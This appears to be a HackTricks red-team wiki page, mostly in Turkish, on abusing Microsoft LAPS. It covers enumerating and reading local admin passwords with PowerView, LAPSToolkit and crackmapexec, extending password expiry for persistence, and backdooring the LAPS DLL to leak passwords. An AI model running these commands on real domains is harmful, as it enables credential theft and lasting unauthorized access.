# LAPS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Temel Bilgiler

Local Administrator Password Solution (LAPS), **yönetici şifreleri**nin **eşsiz, rastgele ve sık sık değiştirildiği** bir sistemi yönetmek için kullanılan bir araçtır ve bu şifreler alan katılmış bilgisayarlara uygulanır. Bu şifreler, Active Directory içinde güvenli bir şekilde saklanır ve yalnızca Erişim Kontrol Listeleri (ACL'ler) aracılığıyla izin verilmiş kullanıcılara erişilebilir. İstemciden sunucuya şifre iletimlerinin güvenliği, **Kerberos sürüm 5** ve **Gelişmiş Şifreleme Standardı (AES)** kullanılarak sağlanır.

Alan bilgisayar nesnelerinde, LAPS'ın uygulanması iki yeni niteliğin eklenmesiyle sonuçlanır: **`ms-mcs-AdmPwd`** ve **`ms-mcs-AdmPwdExpirationTime`**. Bu nitelikler, sırasıyla **düz metin yönetici şifresini** ve **şifrenin son kullanma tarihini** saklar.

### Aktif olup olmadığını kontrol et
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Parola Erişimi

Ham LAPS politikasını `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` adresinden **indirebilir** ve ardından bu dosyayı insan tarafından okunabilir formata dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketinden **`Parse-PolFile`** kullanılabilir.

Ayrıca, erişim sağladığımız bir makinede yüklüyse **yerel LAPS PowerShell cmdlet'leri** de kullanılabilir:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** ayrıca **şifrenin kimler tarafından okunabileceğini ve okunmasını** bulmak için de kullanılabilir:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) LAPS'in birkaç işlevle sayımını kolaylaştırır.\
Bunlardan biri, **LAPS etkin olan tüm bilgisayarlar için `ExtendedRights`'ı** ayrıştırmaktır. Bu, genellikle korunan gruplardaki kullanıcılar olan **LAPS şifrelerini okumak için özel olarak yetkilendirilmiş grupları** gösterecektir.\
Bir **hesap**, bir bilgisayarı bir domaine **katıldığında**, o ana bilgisayar üzerinde `All Extended Rights` alır ve bu hak, **hesaba** **şifreleri okuma** yeteneği verir. Sayım, bir ana bilgisayarda LAPS şifresini okuyabilen bir kullanıcı hesabını gösterebilir. Bu, LAPS şifrelerini okuyabilen **belirli AD kullanıcılarını hedeflememize** yardımcı olabilir.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**
Eğer bir powershell erişiminiz yoksa, bu yetkiyi LDAP üzerinden uzaktan kötüye kullanabilirsiniz.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Bu, kullanıcının okuyabileceği tüm şifreleri dökecek ve farklı bir kullanıcı ile daha iyi bir yer edinmenizi sağlayacaktır.

## **LAPS Sürekliliği**

### **Son Kullanma Tarihi**

Bir kez yönetici olduğunuzda, **şifreleri elde etmek** ve bir makinenin **şifresini güncellemesini engellemek** için **son kullanma tarihini geleceğe ayarlamak** mümkündür.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Şifre, bir **admin** **`Reset-AdmPwdPassword`** cmdlet'ini kullanırsa veya LAPS GPO'sunda **Şifre süresinin politika gereksinimlerinden daha uzun olmasına izin verme** seçeneği etkinse yine de sıfırlanacaktır.
{% endhint %}

### Arka Kapı

LAPS'ın orijinal kaynak kodu [burada](https://github.com/GreyCorbel/admpwd) bulunabilir, bu nedenle kodda (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` yönteminde) bir arka kapı koymak mümkündür; bu, bir şekilde **yeni şifreleri dışarı sızdıracak veya bir yere depolayacaktır**.

Sonra, yeni `AdmPwd.PS.dll` dosyasını derleyin ve bunu `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` konumuna yükleyin (ve değiştirme zamanını değiştirin).

## Referanslar
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**

</details>
{% endhint %}
